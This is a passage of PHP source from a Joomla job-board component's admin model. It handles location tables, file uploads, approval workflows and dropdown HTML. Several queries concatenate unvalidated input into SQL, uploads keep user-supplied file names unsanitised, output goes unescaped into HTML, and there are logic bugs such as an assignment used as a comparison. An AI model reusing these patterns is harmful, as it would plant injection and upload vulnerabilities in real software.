        $db = & JFactory::getDBO();
        $query = "SELECT country.id AS countryid FROM `#__js_job_countries` AS country ";
        $db->setQuery($query);
        $country_data = $db->loadObjectList();
        $query = "DELETE FROM `#__js_job_cities`";
        $db->setQuery($query);
        $db->query();
        foreach ($country_data AS $d) {
            switch ($d->countryid) {
                case 1:// United States Country
                    $query = "SELECT state.id AS stateid FROM `#__js_job_states` AS state WHERE countryid=" . $d->countryid;
                    $db->setQuery($query);
                    $us_state_by_id = $db->loadObjectList();
                    if (is_array($us_state_by_id) AND (!empty($us_state_by_id))) {
                        foreach ($us_state_by_id AS $sid) {
                            if ($sid->stateid) {
                                $query = "INSERT INTO `#__js_job_cities`(id,cityName,name,stateid,countryid,isedit,enabled,serverid)
                                            SELECT city.id AS id,city.cityName AS cityName,city.name AS name,city.stateid AS stateid,city.countryid AS countryid,city.isedit AS isedit,city.enabled AS enabled,city.serverid AS serverid 
                                            FROM `#__js_job_cities_new` AS city WHERE stateid=" . $sid->stateid . " AND countryid=" . $d->countryid . " group by cityName,name ";
                                $db->setQuery($query);
                                if (!$db->Query())
                                    return 0;
                            }else {
                                $query = "INSERT INTO `#__js_job_cities`(id,cityName,name,stateid,countryid,isedit,enabled,serverid)
											SELECT city.id AS id,city.cityName AS cityName,city.name AS name,city.stateid AS stateid,city.countryid AS countryid,city.isedit AS isedit,city.enabled AS enabled,city.serverid AS serverid 
											FROM `#__js_job_cities_new` AS city WHERE countryid=" . $d->countryid . " group by cityName,name ";
                                $db->setQuery($query);
                                if (!$db->Query())
                                    return 0;
                            }
                        }
                    }
                    break;
                case 2:
                    $query = "SELECT state.id AS stateid FROM `#__js_job_states` AS state WHERE countryid=" . $d->countryid;
                    $db->setQuery($query);
                    $ca_state_by_id = $db->loadObjectList();
                    if (is_array($ca_state_by_id) AND (!empty($ca_state_by_id))) {
                        foreach ($ca_state_by_id AS $sid) {
                            if ($sid->stateid) {
                                $query = "INSERT INTO `#__js_job_cities`(id,cityName,name,stateid,countryid,isedit,enabled,serverid)
											SELECT city.id AS id,city.cityName AS cityName,city.name AS name,city.stateid AS stateid,city.countryid AS countryid,city.isedit AS isedit,city.enabled AS enabled,city.serverid AS serverid 
											FROM `#__js_job_cities_new` AS city WHERE stateid=" . $sid->stateid . " AND countryid=" . $d->countryid . " group by cityName,name ";
                                $db->setQuery($query);
                                if (!$db->Query())
                                    return 0;
                            }else {
                                $query = "INSERT INTO `#__js_job_cities`(id,cityName,name,stateid,countryid,isedit,enabled,serverid)
											SELECT city.id AS id,city.cityName AS cityName,city.name AS name,city.stateid AS stateid,city.countryid AS countryid,city.isedit AS isedit,city.enabled AS enabled,city.serverid AS serverid 
											FROM `#__js_job_cities_new` AS city WHERE countryid=" . $d->countryid . " group by cityName,name ";
                                $db->setQuery($query);
                                if (!$db->Query())
                                    return 0;
                            }
                        }
                    }
                    break;
                default:
                    $query = "INSERT INTO `#__js_job_cities`(id,cityName,name,stateid,countryid,isedit,enabled,serverid)
								SELECT city.id AS id,city.cityName AS cityName,city.name AS name,city.stateid AS stateid,city.countryid AS countryid,city.isedit AS isedit,city.enabled AS enabled,city.serverid AS serverid 
								FROM `#__js_job_cities_new` AS city WHERE countryid=" . $d->countryid . " group by cityName,name ";
                    $db->setQuery($query);
                    if (!$db->Query())
                        return 0;
                    break;
            }
        }
        return true;
    }

    function correctStateData() {
        $db = & JFactory::getDBO();
        $query = "SELECT country.id AS countryid FROM `#__js_job_countries` AS country ";
        $db->setQuery($query);
        $country_data = $db->loadObjectList();
        $query = "DELETE FROM `#__js_job_states`";
        $db->setQuery($query);
        $db->query();
        foreach ($country_data AS $d) {
            $query = "INSERT INTO `#__js_job_states`(id,name,shortRegion,countryid,enabled,serverid)
					SELECT state.id AS id,state.name AS name,state.shortRegion AS shortRegion,state.countryid AS countryid,state.enabled AS enabled,state.serverid AS serverid 
					FROM `#__js_job_states_new` AS state WHERE countryid=" . $d->countryid . " group by name ";
            $db->setQuery($query);
            if (!$db->Query())
                return 0;
        }
        return true;
    }

    function isCountryExist($country) {
        $db = & JFactory::getDBO();
        $query = "SELECT COUNT(id) FROM #__js_job_countries WHERE name = " . $db->Quote($country);
        $db->setQuery($query);
        $result = $db->loadResult();
        if ($result == 0)
            return false;
        else
            return true;
    }

    function isStateExist($state, $countryid) {
        $db = & JFactory::getDBO();
        $query = "SELECT COUNT(id) FROM #__js_job_states WHERE name = " . $db->Quote($state) . " AND countryid = " . $countryid;

        $db->setQuery($query);
        $result = $db->loadResult();
        if ($result == 0)
            return false;
        else
            return true;
    }

    function isCountyExist($county, $statecode) {
        $db = & JFactory::getDBO();
        $query = "SELECT COUNT(id) FROM #__js_job_counties WHERE name = " . $db->Quote($county) . " AND statecode = " . $db->Quote($statecode);

        $db->setQuery($query);
        $result = $db->loadResult();
        if ($result == 0)
            return false;
        else
            return true;
    }

    function isCityExist($countryid, $stateid, $title) {
        if (!is_numeric($countryid))
            return false;
        if (!is_numeric($stateid))
            return false;
        $db = & JFactory::getDBO();
        $query = "SELECT COUNT(id) FROM #__js_job_cities WHERE countryid=" . $countryid . "
		AND stateid=" . $stateid . " AND LOWER(name) = " . $db->Quote(strtolower($title));
        $db->setQuery($query);
        $result = $db->loadResult();
        if ($result == 0)
            return 0;
        else
            return 1;
    }

    function uploadFile($id, $action, $isdeletefile) {
        $db = & JFactory::getDBO();

        $str = JPATH_BASE;
        $base = substr($str, 0, strlen($str) - 14); //remove administrator
        if (!isset($this->_config))
            $this->getConfig();
        foreach ($this->_config as $conf) {
            if ($conf->configname == 'data_directory')
                $datadirectory = $conf->configvalue;
        }
        $path = $base . '/' . $datadirectory;
        if (!file_exists($path)) { // create user directory
            $this->makeDir($path);
        }
        $isupload = false;
        $path = $path . '/data';
        if (!file_exists($path)) { // create user directory
            $this->makeDir($path);
        }
        $path = $path . '/employer';
        if (!file_exists($path)) { // create user directory
            $this->makeDir($path);
        }

        $isupload = false;
        if ($action == 1) { //Company logo
            if ($_FILES['logo']['size'] > 0) {
                $file_name = $_FILES['logo']['name']; // file name
                $file_tmp = $_FILES['logo']['tmp_name']; // actual location

                $ext = $this->getExtension($file_name);
                $ext = strtolower($ext);
                if (($ext != "gif") && ($ext != "jpg") && ($ext != "jpeg") && ($ext != "png"))
                    return 6; //file type mistmathc

                $userpath = $path . '/comp_' . $id;
                if (!file_exists($userpath)) { // create user directory
                    $this->makeDir($userpath);
                }
                $userpath = $userpath . '/logo';
                if (!file_exists($userpath)) { // create logo directory
                    $this->makeDir($userpath);
                }
                $isupload = true;
            }
        } elseif ($action == 2) { //Company small logo
            if ($_FILES['smalllogo']['size'] > 0) {
                $file_name = $_FILES['smalllogo']['name']; // file name
                $file_tmp = $_FILES['smalllogo']['tmp_name']; // actual location

                $ext = $this->getExtension($file_name);
                $ext = strtolower($ext);
                if (($ext != "gif") && ($ext != "jpg") && ($ext != "jpeg") && ($ext != "png"))
                    return 6; //file type mistmathc

                $userpath = $path . '/comp_' . $id;
                if (!file_exists($userpath)) { // create user directory
                    $this->makeDir($userpath);
                }
                $userpath = $userpath . '/smalllogo';
                if (!file_exists($userpath)) { // create logo directory
                    $this->makeDir($userpath);
                }
                $isupload = true;
            }
        } elseif ($action == 3) { //About Company
            if ($_FILES['aboutcompany']['size'] > 0) {
                $file_name = $_FILES['aboutcompany']['name']; // file name
                $file_tmp = $_FILES['aboutcompany']['tmp_name']; // actual location

                $ext = $this->getExtension($file_name);
                $ext = strtolower($ext);
                if (($ext != "txt") && ($ext != "doc") && ($ext != "docx") && ($ext != "pdf"))
                    return 6; //file type mistmathc

                $userpath = $path . '/comp_' . $id;
                if (!file_exists($userpath)) { // create user directory
                    $this->makeDir($userpath);
                }
                $userpath = $userpath . '/aboutcompany';
                if (!file_exists($userpath)) { // create logo directory
                    $this->makeDir($userpath);
                }
                $isupload = true;
            }
        }

        if ($isupload) {
            $files = glob($userpath . '/*.*');
            array_map('unlink', $files);  //delete all file in directory

            move_uploaded_file($file_tmp, $userpath . '/' . $file_name);
            return $userpath . '/' . $file_name;
            return 1;
        } else { // DELETE FILES
            if ($action == 1) { // company logo
                if ($isdeletefile == 1) {
                    $userpath = $path . '/comp_' . $id . '/logo';
                    $files = glob($userpath . '/*.*');
                    array_map('unlink', $files); // delete all file in the direcoty 
                }
            } elseif ($action == 2) { // company small logo
                if ($isdeletefile == 1) {
                    $userpath = $path . '/comp_' . $id . '/smalllogo';
                    $files = glob($userpath . '/*.*');
                    array_map('unlink', $files); // delete all file in the direcoty 
                }
            } elseif ($action == 3) { // about company 
                if ($isdeletefile == 1) {
                    $userpath = $path . '/comp_' . $id . '/aboutcompany';
                    $files = glob($userpath . '/*.*');
                    array_map('unlink', $files); // delete all file in the direcoty 
                }
            }
            return 1;
        }
    }

    function departmentApprove($departmentid) {
        if (is_numeric($departmentid) == false)
            return false;
        $db = & JFactory::getDBO();

        $query = "UPDATE #__js_job_departments SET status = 1 WHERE id = " . $departmentid;
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        if ($this->_client_auth_key != "") {
            $data_department_approve = array();
            $query = "SELECT serverid FROM #__js_job_departments WHERE id = " . $departmentid;
            $db->setQuery($query);
            $serverdepartmentid = $db->loadResult();
            $data_department_approve['id'] = $serverdepartmentid;
            $data_department_approve['department_id'] = $departmentid;
            $data_department_approve['authkey'] = $this->_client_auth_key;
            $fortask = "departmentapprove";
            $server_json_data_array = json_encode($data_department_approve);
            $jsjobsharingobject = new JSJobsModelJobSharing;
            $return_server_value = $jsjobsharingobject->serverTask($server_json_data_array, $fortask);
            return json_decode($return_server_value, true);
        } else {
            return true;
        }
    }

    function departmentReject($departmentid) {
        if (is_numeric($departmentid) == false)
            return false;
        $db = & JFactory::getDBO();

        $query = "UPDATE #__js_job_departments SET status = -1 WHERE id = " . $departmentid;
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        if ($this->_client_auth_key != "") {
            $data_department_reject = array();
            $query = "SELECT serverid FROM #__js_job_departments WHERE id = " . $departmentid;
            $db->setQuery($query);
            $serverdepartmentid = $db->loadResult();
            $data_department_reject['id'] = $serverdepartmentid;
            $data_department_reject['department_id'] = $departmentid;
            $data_department_reject['authkey'] = $this->_client_auth_key;
            $fortask = "departmentreject";
            $server_json_data_array = json_encode($data_department_reject);
            $jsjobsharingobject = new JSJobsModelJobSharing;
            $return_server_value = $jsjobsharingobject->serverTask($server_json_data_array, $fortask);
            return json_decode($return_server_value, true);
        } else {
            return true;
        }
    }

    function companyApprove($company_id) {
        if (is_numeric($company_id) == false)
            return false;
        $db = & JFactory::getDBO();

        $query = "UPDATE #__js_job_companies SET status = 1 WHERE id = " . $company_id;
        $db->setQuery($query);
        if (!$db->query())
            return false;
        $company_approve_email = $this->sendMail(1, 1, $company_id);
        if ($this->_client_auth_key != "") {
            $data_company_approve = array();
            $query = "SELECT serverid FROM #__js_job_companies WHERE id = " . $company_id;
            $db->setQuery($query);
            $servercompanyid = $db->loadResult();
            $data_company_approve['id'] = $servercompanyid;
            $data_company_approve['company_id'] = $company_id;
            $data_company_approve['authkey'] = $this->_client_auth_key;
            $fortask = "companyapprove";
            $server_json_data_array = json_encode($data_company_approve);
            $jsjobsharingobject = new JSJobsModelJobSharing;
            $return_server_value = $jsjobsharingobject->serverTask($server_json_data_array, $fortask);
            return json_decode($return_server_value, true);
        } else {
            return true;
        }
    }

    function companyReject($company_id) {
        if (is_numeric($company_id) == false)
            return false;
        $db = & JFactory::getDBO();

        $query = "UPDATE #__js_job_companies SET status = -1 WHERE id = " . $company_id;
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        $company_reject_email = $this->sendMail(1, -1, $company_id);
        if ($this->_client_auth_key != "") {
            $data_company_reject = array();
            $query = "SELECT serverid FROM #__js_job_companies WHERE id = " . $company_id;
            $db->setQuery($query);
            $servercompanyid = $db->loadResult();
            $data_company_reject['id'] = $servercompanyid;
            $data_company_reject['company_id'] = $company_id;
            $data_company_reject['authkey'] = $this->_client_auth_key;
            $fortask = "companyreject";
            $server_json_data_array = json_encode($data_company_reject);
            $jsjobsharingobject = new JSJobsModelJobSharing;
            $return_server_value = $jsjobsharingobject->serverTask($server_json_data_array, $fortask);
            return json_decode($return_server_value, true);
        } else {
            return true;
        }
    }

    function folderApprove($folderid) {
        if (is_numeric($folderid) == false)
            return false;
        $db = & JFactory::getDBO();

        $query = "UPDATE #__js_job_folders SET status = 1 WHERE id = " . $folderid;
        $db->setQuery($query);
        if (!$db->query())
            return false;
        return $this->sendMail(1, 1, $folderid);
    }

    function folderReject($folderid) {
        if (is_numeric($folderid) == false)
            return false;
        $db = & JFactory::getDBO();

        $query = "UPDATE #__js_job_folders SET status = -1 WHERE id = " . $folderid;
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        return $this->sendMail(1, -1, $folderid);
    }

    function jobApprove($job_id) {
        if (is_numeric($job_id) == false)
            return false;
        $db = & JFactory::getDBO();

        $query = "UPDATE #__js_job_jobs SET status = 1 WHERE id = " . $db->Quote($job_id);
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        $this->sendMail(2, 1, $job_id);
        $this->sendMail(4, 1, $job_id);

        //$this->sendJobAlertJobseeker($job_id);
        if ($this->_client_auth_key != "") {
            $data_job_approve = array();
            $query = "SELECT serverid FROM #__js_job_jobs WHERE id = " . $job_id;
            $db->setQuery($query);
            $serverjobid = $db->loadResult();
            $data_job_approve['id'] = $serverjobid;
            $data_job_approve['job_id'] = $job_id;
            $data_job_approve['authkey'] = $this->_client_auth_key;
            $fortask = "jobapprove";
            $server_json_data_array = json_encode($data_job_approve);
            $jsjobsharingobject = new JSJobsModelJobSharing;
            $return_server_value = $jsjobsharingobject->serverTask($server_json_data_array, $fortask);
            $return = json_decode($return_server_value, true);
        } else {
            $return = true;
        }
        //register_shutdown_function(array($this, 'sendJobAlertJobseeker'), $job_id);

        return $return;
    }

    function jobReject($job_id) {
        if (is_numeric($job_id) == false)
            return false;
        $db = & JFactory::getDBO();

        $query = "UPDATE #__js_job_jobs SET status = -1 WHERE id = " . $db->Quote($job_id);
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        $this->sendMail(2, -1, $job_id);
        if ($this->_client_auth_key != "") {
            $data_job_reject = array();
            $query = "SELECT serverid FROM #__js_job_jobs WHERE id = " . $job_id;
            $db->setQuery($query);
            $serverjobid = $db->loadResult();
            $data_job_reject['id'] = $serverjobid;
            $data_job_reject['job_id'] = $job_id;
            $data_job_reject['authkey'] = $this->_client_auth_key;
            $fortask = "jobreject";
            $server_json_data_array = json_encode($data_job_reject);
            $jsjobsharingobject = new JSJobsModelJobSharing;
            $return_server_value = $jsjobsharingobject->serverTask($server_json_data_array, $fortask);
            return json_decode($return_server_value, true);
        } else {
            return true;
        }
    }

    function empappApprove($app_id) {
        if (is_numeric($app_id) == false)
            return false;
        $db = & JFactory::getDBO();

        $query = "UPDATE #__js_job_resume SET status = 1 WHERE id = " . $db->Quote($app_id);
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        $this->sendMail(3, 1, $app_id);
        if ($this->_client_auth_key != "") {
            $data_resume_approve = array();
            $query = "SELECT serverid FROM #__js_job_resume WHERE id = " . $app_id;
            $db->setQuery($query);
            $serverresumeid = $db->loadResult();
            $data_resume_approve['id'] = $serverresumeid;
            $data_resume_approve['resume_id'] = $app_id;
            $data_resume_approve['authkey'] = $this->_client_auth_key;
            $fortask = "resumeapprove";
            $server_json_data_array = json_encode($data_resume_approve);
            $jsjobsharingobject = new JSJobsModelJobSharing;
            $return_server_value = $jsjobsharingobject->serverTask($server_json_data_array, $fortask);
            return json_decode($return_server_value, true);
        } else {
            return true;
        }
    }

    function empappReject($app_id) {
        if (is_numeric($app_id) == false)
            return false;
        $db = & JFactory::getDBO();

        $query = "UPDATE #__js_job_resume SET status = -1 WHERE id = " . $db->Quote($app_id);
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        $this->sendMail(3, -1, $app_id);
        if ($this->_client_auth_key != "") {
            $data_resume_reject = array();
            $query = "SELECT serverid FROM #__js_job_resume WHERE id = " . $app_id;
            $db->setQuery($query);
            $serverresumeid = $db->loadResult();
            $data_resume_reject['id'] = $serverresumeid;
            $data_resume_reject['resume_id'] = $app_id;
            $data_resume_reject['authkey'] = $this->_client_auth_key;
            $fortask = "resumereject";
            $server_json_data_array = json_encode($data_resume_reject);
            $jsjobsharingobject = new JSJobsModelJobSharing;
            $return_server_value = $jsjobsharingobject->serverTask($server_json_data_array, $fortask);
            return json_decode($return_server_value, true);
        } else {
            return true;
        }
    }

    function fieldPublished($field_id, $value) {
        if (is_numeric($field_id) == false)
            return false;
        $db = & JFactory::getDBO();
        $query = " UPDATE #__js_job_fieldsordering
					SET published = " . $value . "
					WHERE cannotunpublish = 0 AND id = " . $field_id;
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        return true;
    }

    function visitorFieldPublished($fieldid, $value) {
        if (is_numeric($fieldid) == false)
            return false;
        $db = & JFactory::getDBO();
        $query = " UPDATE #__js_job_fieldsordering
					SET isvisitorpublished = " . $value . "
					WHERE cannotunpublish = 0 AND id = " . $fieldid;
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        return true;
    }

    function fieldOrderingUp($field_id) {
        if (is_numeric($field_id) == false)
            return false;
        $db = & JFactory::getDBO();
        $query = "UPDATE #__js_job_fieldsordering AS f1, #__js_job_fieldsordering AS f2
					SET f1.ordering = f1.ordering - 1
					WHERE f1.ordering = f2.ordering + 1
					AND f1.fieldfor = f2.fieldfor
					AND f2.id = " . $field_id . " ; ";
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }

        $query = " UPDATE #__js_job_fieldsordering
					SET ordering = ordering + 1
					WHERE id = " . $field_id . ";"
        ;
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        return true;
    }

    function fieldOrderingDown($field_id) {
        if (is_numeric($field_id) == false)
            return false;
        $db = & JFactory::getDBO();
        $query = "UPDATE #__js_job_fieldsordering AS f1, #__js_job_fieldsordering AS f2
					SET f1.ordering = f1.ordering + 1
					WHERE f1.ordering = f2.ordering - 1
					AND f1.fieldfor = f2.fieldfor
					AND f2.id = " . $field_id . " ; ";

        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }

        $query = " UPDATE #__js_job_fieldsordering
					SET ordering = ordering - 1
					WHERE id = " . $field_id . ";";
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        return true;
    }

    function DefaultListAddressDataSharing($data, $val, $hasstate) {
        $db = &$this->getDBO();
        if ($data == 'defaultsharingstate') {  // states
            $query = "SELECT serverid AS id , name from `#__js_job_states` WHERE enabled = 1 AND countryid= '$val' ORDER BY name ASC";
            $db->setQuery($query);
            $result = $db->loadObjectList();
            if (empty($result)) {
                $return_value = "";
            } else {
                $return_value = "<select name='default_sharing_state' id='default_sharing_state' class='inputbox' onChange=\"dochange('defaultsharingcity', this.value)\">\n";
                $return_value .= "<option value='0'>" . JText::_('JS_CHOOSE_STATE') . "</option>\n";

                foreach ($result as $row) {
                    $return_value .= "<option value=\"$row->id\" >$row->name</option> \n";
                }
                $return_value .= "</select>\n";
            }
        } elseif ($data = "defaultsharingcity") {
            if ($hasstate == -1) {
                $query = "SELECT serverid AS id , name from `#__js_job_cities` WHERE enabled = 1 AND countryid= '$val' ORDER BY name ASC";
            } else {
                $query = "SELECT serverid AS id , name from `#__js_job_cities` WHERE enabled = 1 AND stateid= '$val' ORDER BY name ASC";
            }
            $db->setQuery($query);
            $result = $db->loadObjectList();
            if (empty($result)) {
                $return_value = "<input class='inputbox' type='text' name='default_sharing_city' id='default_sharing_city' readonly='readonly' size='40' maxlength='100'  />";
            } else {
                $return_value = "<select name='default_sharing_city' id='default_sharing_city' class='inputbox' >\n";
                $return_value .= "<option value='0'>" . JText::_('JS_CHOOSE_CITY') . "</option>\n";

                foreach ($result as $row) {
                    $return_value .= "<option value=\"$row->id\" >$row->name</option> \n";
                }
                $return_value .= "</select>\n";
            }
        }
        return $return_value;
    }

    function &listAddressData($data, $val) {
        $db = &$this->getDBO();
        if ($data == 'country') {  // country
            $query = "SELECT id AS code, name FROM `#__js_job_countries` WHERE enabled = 'Y' ORDER BY name ASC";
            $db->setQuery($query);
            $result = $db->loadObjectList();

            if (empty($result)) {
                $return_value = "<input class='inputbox' type='text' name='country' id='country' size='40' maxlength='100'  />";
            } else {
                $return_value = "<select name='country' id='country' onChange=\"dochange('state', this.value)\">\n";
                $return_value .= "<option value='0'>" . JText::_('JS_CHOOSE_COUNTRY') . "</option>\n";

                foreach ($result as $row) {
                    $return_value .= "<option value=\"$row->code\" >$row->name</option> \n";
                }
                $return_value .= "</select>\n";
            }
        } else if ($data == 'state') {  // states
            $query = "SELECT id AS code, name from `#__js_job_states` WHERE enabled = 'Y' AND countryid= '$val' ORDER BY name ASC";
            $db->setQuery($query);
            $result = $db->loadObjectList();
            if (empty($result)) {
                $return_value = "<input class='inputbox' type='text' name='state' id='state' size='40' maxlength='100'  />";
            } else {
                $return_value = "<select name='state' id='state' class='inputbox' onChange=\"dochange('city', this.value)\">\n";
                $return_value .= "<option value='0'>" . JText::_('JS_CHOOSE_STATE') . "</option>\n";

                foreach ($result as $row) {
                    $return_value .= "<option value=\"$row->code\" >$row->name</option> \n";
                }
                $return_value .= "</select>\n";
            }
        } else if ($data == 'city') { // city
            $query = "SELECT id AS code, name from `#__js_job_cities` WHERE enabled = 'Y' AND stateid= '$val' ORDER BY 'name'";
            $db->setQuery($query);
            $result = $db->loadObjectList();
            if (empty($result)) {
                $return_value = "<input class='inputbox' type='text' name='city' id='city' size='40' maxlength='100'  />";
            } else {
                $return_value = "<select name='city' id='city' class='inputbox' onChange=\"dochange('zipcode', this.value)\">\n";
                $return_value .= "<option value='0'>" . JText::_('JS_CHOOSE_CITY') . "</option>\n";


                foreach ($result as $row) {
                    $return_value .= "<option value=\"$row->code\" >$row->name</option> \n";
                }
                $return_value .= "</select>\n";
            }
        }
        return $return_value;
    }

    function &listEmpAddressData($name, $myname, $nextname, $data, $val) {
        $db = &$this->getDBO();
        if ($data == 'country') {  // country
            $query = "SELECT id AS code, name FROM `#__js_job_countries` WHERE enabled = 'Y' ORDER BY name ASC";
            $db->setQuery($query);
            $result = $db->loadObjectList();

            if (empty($result)) {
                $return_value = "<input class='inputbox' type='text' name='$name' id='$name' size='40' maxlength='100'  />";
            } else {

                $return_value = "<select name='$name' id='$name' onChange=\"dochange(\"$myname\",'state', this.value)\">\n";
                $return_value .= "<option value='0'>" . JText::_('JS_CHOOSE_COUNTRY') . "</option>\n";

                foreach ($result as $row) {
                    $return_value .= "<option value=\"$row->code\" >$row->name</option> \n";
                }
                $return_value .= "</select>\n";
            }
        } else if ($data == 'state') {  // states
            $query = "SELECT id AS code, name from `#__js_job_states` WHERE enabled = 'Y' AND countryid= $val ORDER BY name ASC";
            $db->setQuery($query);
            $result = $db->loadObjectList();
            if (empty($result)) {
                $return_value = "<input class='inputbox' type='text' name='$name' id='$name' size='40' maxlength='100'  />";
            } else {
                $return_value = "<select name='$name' id='$name' class='inputbox' onChange=\"dochange('$myname','$nextname','','city', this.value)\">\n";
                $return_value .= "<option value='0'>" . JText::_('JS_CHOOSE_STATE') . "</option>\n";

                foreach ($result as $row) {
                    $return_value .= "<option value=\"$row->code\" >$row->name</option> \n";
                }
                $return_value .= "</select>\n";
            }
        } else if ($data == 'city') { // second dropdown
            $query = "SELECT id AS code, name from `#__js_job_cities` WHERE enabled = 'Y' AND stateid= $val ORDER BY 'name'";
            $db->setQuery($query);
            $result = $db->loadObjectList();
            if (empty($result)) {
                $return_value = "<input class='inputbox' type='text' id='$name' name='$name' size='40' maxlength='100'  />";
            } else {
                $return_value = "<select name='$name' id='$name' class='inputbox' onChange=\"dochange('zipcode', this.value)\">\n";
                $return_value .= "<option value='0'>" . JText::_('JS_CHOOSE_CITY') . "</option>\n";

                foreach ($result as $row) {
                    $return_value .= "<option value=\"$row->code\" >$row->name</option> \n";
                }
                $return_value .= "</select>\n";
            }
        }
        return $return_value;
    }

    function & getApplication() {
        if (!$this->_application && $this->_id != null) {
            $db = & $this->getDBO();
            $query = "SELECT * FROM `#__js_job_jobs` WHERE " .
                    $db->quote('id') . " = " . $this->_id;
            $db->setQuery($query);
            $this->_application = $db->loadObject();
            $this->getOptions();
        }
        return $this->_application;
    }

    // save the current data
    function save($data) {
        
    }

    function isCategoryExist($cat_title) {
        $db = & JFactory::getDBO();

        $query = "SELECT COUNT(id) FROM #__js_job_categories WHERE cat_title = " . $db->Quote($cat_title);
        $db->setQuery($query);
        $result = $db->loadResult();
        if ($result == 0)
            return false;
        else
            return true;
    }

    function isSubCategoryExist($title) {
        $db = & JFactory::getDBO();

        $query = "SELECT COUNT(id) FROM #__js_job_subcategories WHERE title = " . $db->Quote($title);
        $db->setQuery($query);
        $result = $db->loadResult();
        if ($result == 0)
            return false;
        else
            return true;
    }

    function isJobTypesExist($title) {
        $db = & JFactory::getDBO();
        $query = "SELECT COUNT(id) FROM #__js_job_jobtypes WHERE title = " . $db->Quote($title);
        $db->setQuery($query);
        $result = $db->loadResult();
        if ($result == 0)
            return false;
        else
            return true;
    }

    function isJobStatusExist($title) {
        $db = & JFactory::getDBO();
        $query = "SELECT COUNT(id) FROM #__js_job_jobstatus WHERE title = " . $db->Quote($title);
        $db->setQuery($query);
        $result = $db->loadResult();
        if ($result == 0)
            return false;
        else
            return true;
    }

    function isJobShiftsExist($title) {
        $db = & JFactory::getDBO();
        $query = "SELECT COUNT(id) FROM #__js_job_shifts WHERE title = " . $db->Quote($title);
        $db->setQuery($query);
        $result = $db->loadResult();
        if ($result == 0)
            return false;
        else
            return true;
    }

    function isHighestEducationExist($title) {
        $db = & JFactory::getDBO();
        $query = "SELECT COUNT(id) FROM #__js_job_heighesteducation WHERE title = " . $db->Quote($title);
        $db->setQuery($query);
        $result = $db->loadResult();
        if ($result == 0)
            return false;
        else
            return true;
    }

    function isAgesExist($title) {
        $db = & JFactory::getDBO();
        $query = "SELECT COUNT(id) FROM #__js_job_ages WHERE title = " . $db->Quote($title);
        $db->setQuery($query);
        $result = $db->loadResult();
        if ($result == 0)
            return false;
        else
            return true;
    }

    function isCareerlevelExist($title) {
        $db = & JFactory::getDBO();
        $query = "SELECT COUNT(id) FROM #__js_job_careerlevels WHERE title = " . $db->Quote($title);
        $db->setQuery($query);
        $result = $db->loadResult();
        if ($result == 0)
            return false;
        else
            return true;
    }

    function isExperiencesExist($title) {
        $db = & JFactory::getDBO();
        $query = "SELECT COUNT(id) FROM #__js_job_experiences WHERE title = " . $db->Quote($title);
        $db->setQuery($query);
        $result = $db->loadResult();
        if ($result == 0)
            return false;
        else
            return true;
    }

    function isCurrencyExist($title) {
        $db = & JFactory::getDBO();
        $query = "SELECT COUNT(id) FROM #__js_job_currencies WHERE title = " . $db->Quote($title);
        $db->setQuery($query);
        $result = $db->loadResult();
        if ($result == 0)
            return false;
        else
            return true;
    }

    function isSalaryRangeExist($rangestart, $rangeend) {
        $db = & JFactory::getDBO();
        $query = "SELECT COUNT(id) FROM #__js_job_salaryrange WHERE rangestart = " . $db->Quote($rangestart) . " AND rangeend=" . $db->Quote($rangeend);
        $db->setQuery($query);
        $result = $db->loadResult();
        if ($result == 0)
            return false;
        else
            return true;
    }

    function isSalaryRangeTypeExist($title) {
        $db = & JFactory::getDBO();
        $query = "SELECT COUNT(id) FROM #__js_job_salaryrangetypes WHERE title = " . $db->Quote($title);
        $db->setQuery($query);
        $result = $db->loadResult();
        if ($result == 0)
            return false;
        else
            return true;
    }

    function SalaryRangeValidation($rangestart, $rangeend) {
        $db = & JFactory::getDBO();
        $query = "SELECT COUNT(id) FROM #__js_job_categories WHERE cat_title = " . $db->Quote($cat_title);
        $db->setQuery($query);
        $result = $db->loadResult();
        if ($result == 0)
            return false;
        else
            return true;
    }

    //send mail
    function sendMailtoVisitor($jobid) {
        if ($jobid)
            if ((is_numeric($jobid) == false) || ($jobid == 0) || ($jobid == ''))
                return false;
        $db = & JFactory::getDBO();
        $templatefor = 'job-alert-visitor';

        $query = "SELECT template.* FROM `#__js_job_emailtemplates` AS template	WHERE template.templatefor = " . $db->Quote($templatefor);
        $db->setQuery($query);
        $template = $db->loadObject();
        $msgSubject = $template->subject;
        $msgBody = $template->body;
        $jobquery = "SELECT job.title, job.jobstatus,job.jobid AS jobid, company.name AS companyname, cat.cat_title AS cattitle,job.sendemail,company.contactemail,company.contactname
                              FROM `#__js_job_jobs` AS job
                              JOIN `#__js_job_companies` AS company ON company.id = job.companyid
                              JOIN `#__js_job_categories` AS cat ON cat.id = job.jobcategory
                              WHERE job.id = " . $jobid;
        $db->setQuery($jobquery);
        $jobuser = $db->loadObject();
        if ($jobuser->jobstatus == 1) {

            $CompanyName = $jobuser->companyname;
            $JobCategory = $jobuser->cattitle;
            $JobTitle = $jobuser->title;
            if ($jobuser->jobstatus == 1)
                $JobStatus = JText::_('JS_APPROVED');
            else
                $JobStatus = JText::_('JS_WAITING_FOR_APPROVEL');
            $EmployerEmail = $jobuser->contactemail;
            $ContactName = $jobuser->contactname;

            $msgSubject = str_replace('{COMPANY_NAME}', $CompanyName, $msgSubject);
            $msgSubject = str_replace('{CONTACT_NAME}', $ContactName, $msgSubject);
            $msgSubject = str_replace('{JOB_CATEGORY}', $JobCategory, $msgSubject);
            $msgSubject = str_replace('{JOB_TITLE}', $JobTitle, $msgSubject);
            $msgSubject = str_replace('{JOB_STATUS}', $JobStatus, $msgSubject);
            $msgBody = str_replace('{COMPANY_NAME}', $CompanyName, $msgBody);
            $msgBody = str_replace('{CONTACT_NAME}', $ContactName, $msgBody);
